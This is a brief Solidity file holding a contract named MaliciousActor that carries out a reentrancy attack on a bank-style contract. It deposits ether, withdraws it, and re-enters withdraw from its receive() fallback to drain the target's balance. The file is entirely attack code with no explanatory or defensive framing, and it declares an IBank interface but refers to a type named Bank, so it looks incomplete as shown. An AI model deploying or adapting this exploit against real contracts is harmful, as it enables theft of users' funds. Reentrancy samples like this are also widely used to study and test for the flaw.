interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract MaliciousActor {
    Bank public targetBank;
    address public owner;

    constructor(address _targetBank) {
        targetBank = Bank(_targetBank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0);
        targetBank.deposit{value: msg.value}();
        targetBank.withdraw(msg.value);
    }

    receive() external payable {
        if (address(targetBank).balance >= msg.value) {
            targetBank.withdraw(msg.value);
        }
    }
}
